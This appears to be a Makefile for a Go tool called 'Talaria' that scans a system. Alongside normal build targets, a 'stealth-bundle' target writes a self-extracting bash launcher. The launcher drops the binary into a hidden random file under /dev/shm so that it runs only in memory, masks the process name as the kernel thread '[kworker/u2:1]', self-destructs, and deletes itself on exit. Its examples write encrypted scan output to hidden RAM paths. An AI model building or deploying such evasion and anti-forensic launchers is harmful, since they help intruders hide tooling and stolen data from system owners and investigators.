.PHONY: all build clean run stealth-bundle strip

BINARY_NAME=talaria
BUNDLE_NAME=talaria.sh

all: build

build:
	@echo "=> Compiling Talaria (Statically Linked)..."
	CGO_ENABLED=0 go build -ldflags="-s -w -extldflags '-static'" -o $(BINARY_NAME) main.go
	@echo "=> Build complete. You can now run ./$(BINARY_NAME)"

# strip: Shrink binary size further with UPX (optional, requires upx installed)
strip: build
	@command -v upx >/dev/null 2>&1 && upx --best --lzma $(BINARY_NAME) && echo "=> UPX compression done." || echo "=> upx not found, skipping compression."

# stealth-bundle: Wraps the binary in a self-extracting bash script.
#   The script drops the binary into /dev/shm (tmpfs → RAM only, no disk write),
#   runs it with stealth flags, then deletes it on exit.
#   Usage after build: ./talaria.sh [any talaria flags]
#   Example: ./talaria.sh --scan all -o /dev/shm/.r --encrypt mykey
stealth-bundle: build
	@echo "=> Generating stealth bundle: $(BUNDLE_NAME)"
	@printf '%s\n' \
		'#!/bin/bash' \
		'# Talaria stealth bundle — self-extracting, runs from /dev/shm (tmpfs)' \
		'# The binary never touches a persistent disk path.' \
		'set -euo pipefail' \
		'_R=$$(cat /proc/sys/kernel/random/uuid 2>/dev/null | tr -d "-" | head -c10)' \
		'_T="/dev/shm/.$$_R"' \
		'_cleanup() { rm -f "$$_T" 2>/dev/null; }' \
		'trap _cleanup EXIT INT TERM' \
		'base64 -d > "$$_T" << '"'"'__PAYLOAD__'"'"'' \
		> $(BUNDLE_NAME)
	@base64 $(BINARY_NAME) >> $(BUNDLE_NAME)
	@printf '%s\n' \
		'__PAYLOAD__' \
		'chmod +x "$$_T"' \
		'"$$_T" --self-destruct --mask "[kworker/u2:1]" "$$@"' \
		> /tmp/_talaria_bundle_tail
	@cat /tmp/_talaria_bundle_tail >> $(BUNDLE_NAME)
	@rm -f /tmp/_talaria_bundle_tail
	@chmod +x $(BUNDLE_NAME)
	@echo "=> Bundle ready: $(BUNDLE_NAME) (size: $$(wc -c < $(BUNDLE_NAME)) bytes)"
	@echo "   Usage: ./$(BUNDLE_NAME) --scan all -o /dev/shm/.report --encrypt <key>"

clean:
	@echo "=> Cleaning up..."
	rm -f $(BINARY_NAME) $(BUNDLE_NAME)
	@echo "=> Clean complete."

run: build
	./$(BINARY_NAME) --scan all
